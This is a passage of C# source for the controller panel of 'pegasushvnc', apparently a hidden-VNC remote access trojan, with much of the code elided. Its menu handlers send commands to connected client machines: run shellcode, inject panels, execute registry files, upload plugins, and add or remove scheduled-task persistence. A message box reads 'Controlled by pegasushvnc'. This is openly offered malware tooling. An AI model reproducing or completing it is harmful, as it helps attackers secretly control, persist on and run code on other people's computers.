...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        private void CheckFiles()
        {
            ...
            {
                MessageBox.Show(ex.Message, "pegasushvnc", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        ...
        private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Controlled by pegasushvnc");
        ...
        {
            Process.Start("https://github.com/qwqdanchun/pegasushvnc");
        }
        ...
        private void reemoteInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
        ...
        private void injectPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void windows81011ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void windowsAMEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void executeregToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
        ...
        private void runShellcodeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
        ...
        private void injectPanelToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        ...
        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ...
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "schtaskunistall"; //unistall scheduler task manager 
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
        ...
        private void addToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ...
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall"; //new install from PEGASUS-HVNC SOURCE CODE !
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
        ...
        private void deleteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ...
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall"; // new unistall from pegasus hvnc source code
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes()); // pegasus free from owl coder !
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients obj in selectedClients)
                {
                    obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
        ...
        private void addPEGASUSSheduleTaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
        ...
        private void uploadsPluginToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void builderToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            // скоро // soon
        }

        private void limeHVNCPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // скоро // soon
        }
    }
